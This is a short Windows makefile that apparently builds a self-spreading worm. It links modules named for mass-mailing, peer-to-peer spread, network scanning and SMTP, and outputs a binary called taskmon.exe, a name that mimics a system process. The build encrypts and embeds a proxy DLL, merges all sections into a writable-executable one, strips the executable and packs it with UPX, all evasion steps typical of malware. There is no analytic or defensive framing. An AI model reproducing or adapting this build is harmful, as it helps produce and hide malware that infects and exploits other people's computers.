OBJS = main.obj lib.obj p2p.obj xdns.obj massmail.obj scan.obj zipstore.obj sco.obj msg.obj xsmtp.obj
LIBS = ws2_32.lib user32.lib kernel32.lib advapi32.lib msvcrt6.lib
EXE  = taskmon.exe
RSRC = resource.res
all: $(EXE)
$(EXE): $(OBJS) $(RSRC) makefile
	link /out:$(EXE) $(OBJS) $(LIBS) $(RSRC) /nologo \
		/nodefaultlib \
		/base:0x004A0000 /opt:ref /stub:work\stub.exe /ignore:4078 \
		/merge:.rdata=.text /merge:.data=.text /section:.text,erwx \
		/filealign:512 /entry:WinMain /subsystem:windows,4.00
	-work\cleanpe.exe $(EXE)
	-upx -9 $(EXE)
main.c: xproxy\xproxy.inc
xproxy\xproxy.inc:
	work\crypt1.exe xproxy\xproxy.dll xproxy\xproxy.tmp
	work\bin2c.exe xproxy\xproxy.tmp xproxy_data >xproxy\xproxy.inc
	del xproxy\xproxy.tmp
$(RSRC): resource.rc resource.ico

.c.obj:
	cl /c /MD /W3 /O1syg /GAF3 /Fo$@ $<
.cpp.obj:
	cl /c /MD /W3 /O1syg /GAF3 /Fo$@ $<
.rc.res:
	rc /fo$@ $<
clean:
	-del *.obj
	-del $(RSRC)
	-del $(EXE)
